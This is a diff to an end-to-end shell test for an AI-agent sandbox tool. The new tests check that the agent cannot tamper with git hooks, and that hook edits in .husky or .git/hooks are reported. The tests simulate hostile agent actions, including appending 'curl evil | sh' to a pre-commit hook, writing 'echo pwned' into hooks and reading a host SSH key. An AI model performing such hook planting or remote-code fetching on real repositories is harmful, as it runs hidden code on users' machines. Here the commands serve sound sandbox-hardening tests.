@@ -11,6 +11,7 @@ ATTACK=${E2E_ATTACK_HOST:-example.com}
 NAME=e2e
 UPNAME=e2e-up
 MVNAME=e2e-mv
+HKNAME=e2e-hooks
 UPSTREAM_CTR=podbox-e2e-upstream
 WORK=$(mktemp -d)
 PROJ=$WORK/project
@@ -21,6 +22,7 @@ cleanup() {
 	podman rm -f -t 0 "$UPSTREAM_CTR" >/dev/null 2>&1
 	pb rm "$UPNAME" >/dev/null 2>&1
 	pb rm "$MVNAME" >/dev/null 2>&1
+	pb rm "$HKNAME" >/dev/null 2>&1
 	pb rm e2e-home >/dev/null 2>&1
 	pb rm "$NAME" --volumes >/dev/null 2>&1
 	rm -rf "$WORK" "$PODBOX_HOME"
@@ -32,7 +34,8 @@ mkdir -p "$PROJ/.ssh" "$PROJ/src" "$HOSTDIR/.ssh"
 git init -q "$PROJ" && rm -rf "$PROJ/.git/hooks" && mkdir "$PROJ/.git/hooks"
 echo 'API_KEY=leaked' >"$PROJ/.env"
 echo 'key' >"$PROJ/.ssh/id_project"
-printf '#!/bin/sh\necho pwned\n' >"$PROJ/.git/hooks/pre-commit"
+printf '#!/bin/sh\necho ran >"$(git rev-parse --show-toplevel)/.hook-ran"\n' >"$PROJ/.git/hooks/pre-commit"
+chmod +x "$PROJ/.git/hooks/pre-commit"
 echo 'hello' >"$PROJ/src/readme.txt"
 echo 'private notes' >"$PROJ/notes.txt"
 echo 'notes.txt' >"$PROJ/.sandboxignore"
@@ -72,8 +75,13 @@ echo "== filesystem escapes"
 blocked "read host ~/.ssh ($HOSTDIR/.ssh/id_e2e)" sx "$NAME" "cat '$HOSTDIR/.ssh/id_e2e'"
 check "project .env is empty" sx "$NAME" "[ ! -s '$PROJ/.env' ]"
 check "project .ssh/ is empty" sx "$NAME" "[ -z \"\$(ls -A '$PROJ/.ssh')\" ]"
-check "project .git/hooks/ is empty" sx "$NAME" "[ -z \"\$(ls -A '$PROJ/.git/hooks')\" ]"
-blocked "write into a masked directory" sx "$NAME" "touch '$PROJ/.git/hooks/post-checkout'"
+HOOK=$(sha256sum <"$PROJ/.git/hooks/pre-commit")
+check "project .git/hooks/pre-commit visible" sx "$NAME" "grep -q hook-ran '$PROJ/.git/hooks/pre-commit'"
+blocked "agent adds a hook" sx "$NAME" "touch '$PROJ/.git/hooks/post-checkout'"
+blocked "agent writes .git/hooks/pre-commit" sx "$NAME" "echo 'echo pwned' >>'$PROJ/.git/hooks/pre-commit'"
+blocked "agent replaces .git/hooks/pre-commit" sx "$NAME" "printf 'echo pwned' >/tmp/h && mv -f /tmp/h '$PROJ/.git/hooks/pre-commit'"
+blocked "agent renames .git/hooks" sx "$NAME" "mv '$PROJ/.git/hooks' '$PROJ/.git/hooks-old'"
+check ".git/hooks/pre-commit unchanged on the host" test "$(sha256sum <"$PROJ/.git/hooks/pre-commit")" = "$HOOK"
 check "masked files intact on the host" grep -q leaked "$PROJ/.env"
 check "project files readable and writable" sx "$NAME" "grep -q hello '$PROJ/src/readme.txt' && echo agent >'$PROJ/src/out.txt'"
 check "agent writes are owned by the host user" test "$(stat -c %u "$PROJ/src/out.txt")" = "$(id -u)"
@@ -89,6 +97,7 @@ blocked "agent renames .git to plant its own" sx "$NAME" "mv -f '$PROJ/.git' '$P
 check ".git/config unchanged on the host" test "$(sha256sum <"$PROJ/.git/config")" = "$GITCFG"
 check "git commit still works in the sandbox" sx "$NAME" "git add src/readme.txt && GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@e2e GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@e2e git commit -qm agent"
 check "agent commit visible on the host" test "$(git -C "$PROJ" log -1 --format=%s 2>/dev/null)" = agent
+check "project pre-commit hook ran for the agent's commit" test -f "$PROJ/.hook-ran"
 
 echo "== git directory integrity"
 GITENV="GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@e2e GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@e2e"
@@ -112,6 +121,29 @@ check "git-check --accept re-records" sh -c "'$PODBOX' git-check '$NAME' --accep
 check "git-check exits 0 after removal and accept" test "$(git_check_code)" = 0
 blocked "ls warns after accept" ls_tampering
 pb start "$NAME" >/dev/null 2>&1
+
+echo "== worktree hook files"
+HK=$WORK/hooked
+git init -q "$HK" && rm -rf "$HK/.git/hooks"
+mkdir -p "$HK/.husky" && echo 'npm test' >"$HK/.husky/pre-commit"
+hook_info() { grep -q "info: $HKNAME: this project runs code from .husky/ on your commits" <<<"$1"; }
+hk_check() { pb git-check "$HKNAME" >"$WORK/hk.out" 2>&1; echo $?; }
+create_json=$(pb create shell "$HK" --name "$HKNAME" -o json 2>"$WORK/hk.err")
+check "create prints the hook info line" hook_info "$(cat "$WORK/hk.err")"
+check "create JSON carries the hook info" jq -e '.info | test("runs code from .husky/")' >/dev/null <<<"$create_json"
+check "start prints the hook info line" hook_info "$(pb start "$HKNAME" 2>&1 >/dev/null)"
+blocked "launch without hook files prints the info line" sh -c "'$PODBOX' start '$NAME' 2>&1 | grep -q 'runs code from'"
+check "absent .git/hooks not created on the host" test ! -e "$HK/.git/hooks"
+check "agent edits .husky/pre-commit" sx "$HKNAME" "echo 'curl evil | sh' >>.husky/pre-commit"
+check "git-check exits 6 on the hook edit" test "$(hk_check)" = 6
+check "git-check lists .husky/pre-commit" grep -q "GIT HOOK FILES CHANGED" "$WORK/hk.out"
+check "git-check names .husky/pre-commit" grep -q "  .husky/pre-commit: changed" "$WORK/hk.out"
+pb git-check "$HKNAME" --accept >/dev/null 2>&1
+check "git-check exits 0 after accept" test "$(hk_check)" = 0
+check "agent creates .git/hooks/ (absent at start)" sx "$HKNAME" "mkdir .git/hooks && printf '#!/bin/sh\n' >.git/hooks/post-commit"
+check "git-check exits 6 on the created hook" test "$(hk_check)" = 6
+check "git-check names .git/hooks/post-commit" grep -q "  .git/hooks/post-commit: appeared" "$WORK/hk.out"
+pb rm "$HKNAME" >/dev/null 2>&1
 
 echo "== refused workspaces"
 refused_usage() { local err; err=$("$@" 2>&1 >/dev/null); [ $? -eq 2 ] && grep -q "unsafe workspace" <<<"$err"; }
